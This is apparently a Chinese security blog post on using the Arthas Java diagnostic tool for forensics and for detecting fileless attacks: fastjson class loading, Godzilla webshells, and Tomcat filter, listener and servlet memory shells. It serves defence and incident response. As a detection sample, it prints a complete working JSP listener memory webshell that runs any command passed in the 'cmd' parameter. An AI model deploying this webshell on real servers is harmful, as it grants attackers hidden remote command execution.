## 概述

Arthas是阿里开源的一款java诊断的工具，主要基于Instrument进行动态代理，以及JVMTI来与JVM进行通信交互。在无文件攻击的概念越来越火热的情况下，红军也急需能够与之对抗的方式，而arthas应该可以成为其中的首选方案

## 基本用法

> 下载：<https://github.com/alibaba/arthas/releases>
>
> 使用：java -jar arthas-boot.jar

### 常用功能

> thread #打印线程 / 查看线程当前的堆栈
>
> jad #反编译class
>
> sc #查看jvm已加载的类信息
>
> sm #查看类的方法信息
>
> redefine #加载外部的.class，redefine已加载的类
>
> dump #已加载类的byte code到特定的目录
>
> classloader #查看classloader的继承树，urls，类的加载信息
>
> tt #方法执行数据的时空隧道
>
> stack #方法的调用栈
>
> trace #方法的内部调用路径
>
> watch #方法执行的详细过程查看
>
> mbean #mbean信息

## 取证实例

### classloader、jad -- fastjson攻击取证

fastjson的攻击很被动的成为了无文件攻击的最佳案例，在waf、日志中捕获到的信息都很难还原出攻击的详情，尤其是当攻击者的ldap服务已经停止的情况下，这个时候就可以使用classloader进行取证

> classloader 按类加载类型查看统计信息
>
> classloader -l 按类加载实例查看统计信息
>
> classloader -t 查看ClassLoader的继承树

![](https://image.3001.net/images/20201024/1603527895_5f93e4d7e2d451ebdae32.png!small)

这次取证中需要用到的是classloader -a #列出所有ClassLoader加载的类

classloader -a 搜索FactoryURLClassLoader

结果如下：

> hash:4b5a7560, java.net.FactoryURLClassLoader@4b5a7560
>
> TouchFile

然后使用jad就可以获取到攻击的详情了

![](https://image.3001.net/images/20201024/1603527920_5f93e4f08a1a41c2b803d.png!small)

### sc、sm -- 无源码情况下的基本信息获取

sc和sm的使用方法基本一致

-E 使用正则进行匹配

-d 打印详情

且类名和方法名都可以使用*作为通配符进行匹配

以哥斯拉的shell分析为例，可以通过sm显示的方法基本判断出shell中有什么样的功能

![](https://image.3001.net/images/20201024/1603527944_5f93e5080ce9a05233558.png!small)

还可以通过关键词搜索，来发现一些已经的恶意类的特征，比如：payload / Evil等等

fastjson加载的恶意类有时候也可以通过这种方式进行搜索

![](https://image.3001.net/images/20201024/1603527978_5f93e52a331981497fd1a.png!small)

###

###

### stack、trace -- 入侵检测

stack和trace的使用方法也基本一致，stack/trace 类名 方法名即可

当一类新的攻击出现的时候，需要快速的通过rasp进行攻击利用捕获时就可以使用stack和trace来协助进行漏洞分析和规则添加

以payload为@com.sun.rowset.JdbcRowSetImpl为例

![](https://image.3001.net/images/20201024/1603528012_5f93e54cda582ffd99af6.png!small)![](https://image.3001.net/images/20201024/1603528054_5f93e5764189c507bc4f9.png!small)

### mbean -- Filter shell检测

之前看过一篇《tomcat结合shiro无文件webshell的技术研究以及检测方法》里面是用jvisualvm来实现的，但是其实arthas也有这个功能

mbean 搜索j2eeType=Filter，然后mbean -m就可以打印出详细的信息了

![](https://image.3001.net/images/20201024/1603528151_5f93e5d72c0544581e404.png!small)

### watch / tt -- 内存shell的另一种检测方式

1、tt -t 类 方法 #是一种当不了解入参、返回、类属性详细情况下，进行快速分析的一种方法

2、watch 类 方法 关注的内容 条件 #当清楚的知道方法的详细情况的时候，进行分析的方式

关注内容 -> params 参数 / returnObj 返回对象 / throwExp 异常/ target 类的属性信息

条件 -> ognl的表达式，比如 params[0]<0

参数 ->

-x 代表展开层级，代表会打印出多少层的数组/hashmap等

-b 方法调用前，-e 方法异常后，-s 方法返回后，-f 方法结束后

以listenershell为例

    
    
    <%@ page import="org.apache.catalina.core.ApplicationContext" %>
    <%@ page import="org.apache.catalina.core.StandardContext" %>
    <%
        Object obj = request.getServletContext();
        java.lang.reflect.Field field = obj.getClass().getDeclaredField("context");
        field.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
        //获取ApplicationContext
        field = applicationContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        StandardContext standardContext = (StandardContext) field.get(applicationContext);
        //获取StandardContext
        ListenerDemo listenerdemo = new ListenerDemo();
        //创建能够执行命令的Listener
        standardContext.addApplicationEventListener(listenerdemo);
    %>
    <%!
        public class ListenerDemo implements ServletRequestListener {
            public void requestDestroyed(ServletRequestEvent sre) {
                System.out.println("requestDestroyed");
            }
            public void requestInitialized(ServletRequestEvent sre) {
                System.out.println("requestInitialized");
                try{
                    String cmd = sre.getServletRequest().getParameter("cmd");
                    Runtime.getRuntime().exec(cmd);
                }catch (Exception e ){
                    //e.printStackTrace();
                }
            }
        }
    %>

可以看到关键点在于

standardContext.addApplicationEventListener(listenerdemo);

首先通过tt -t 打印出standardContext类在一次url访问的时候会触发到的函数

这其中很明显跟listener相关的就是getApplicationEventListeners函数

![](https://image.3001.net/images/20201024/1603528373_5f93e6b57a2e1f366ba2a.png!small)

然后使用watch returnObj 就可以当前的listener的信息了

![](https://image.3001.net/images/20201024/1603528398_5f93e6ce9e1e0584c33b0.png!small)

类似的其他类型的隐藏shell都可以获取的到

> Filter shell
>
> watch org.apache.catalina.core.StandardContext findFilterMaps returnObj
>
> watch org.apache.catalina.core.StandardContext getServletContext
> target.filterDefs
>
> Listener shell
>
> watch org.apache.catalina.core.StandardContext getApplicationEventListeners
> returnObj
>
> Servlet shell
>
> watch org.apache.catalina.core.StandardContext findFilterMaps
> target.servletMappings
>
> watch org.apache.catalina.core.ContainerBase findChildren returnObj
>
> watch org.apache.catalina.core.StandardWrapper getServlet returnObj

### ognl -- shutdownhook

> ognl
> '@[java.lang.System@out.println](mailto:java.lang.System@out.println)("hello
> ognl")' 通过ognl做动态执行
>
> ognl '@类名@静态属性名'
>
> ognl '@类@静态方法("参数")'
>
> ognl '#value1=@类@方法(""),#value2=xxx(#value1),{#value1,#value2}' 变量赋值
>
> ognl 'target.{name}' 可以取出来array中的每一个name字段
>
> ognl '@[Test@n.entrySet](mailto:Test@n.entrySet)().iterator.{?
> #this.key.name() == "RUN"}' 迭代器

大致的使用方式就是这样，实际的案例借用下长亭小哥《杂谈Java内存Webshell的攻与防》中的案例

> ognl
> "@java.lang.ApplicationShutdownHooks@hooks.keySet().toArray().{getClass()}.{getName()}"

### dump -- 批量本地分析 / jad无法反编译的情况下

比如哥斯拉的shell，直接jad会失败

![](https://image.3001.net/images/20201024/1603528451_5f93e703e6406ba47716a.png!small)

不过dump功能有个缺陷，详见<https://github.com/alibaba/arthas/issues/763>

这个时候可以使用<https://github.com/hengyunabc/dumpclass>进行dump，然后配合Fernflower
进行反编译即可(jd-gui反编译这个class会报错)

![](https://image.3001.net/images/20201024/1603528471_5f93e717d80fcefab17de.png!small)

## 参考文档

>
> [https://www.cnblogs.com/potatsoSec/p/13060261.html﻿](https://www.cnblogs.com/potatsoSec/p/13060261.html)
>
> <https://zhuanlan.zhihu.com/p/227862004>

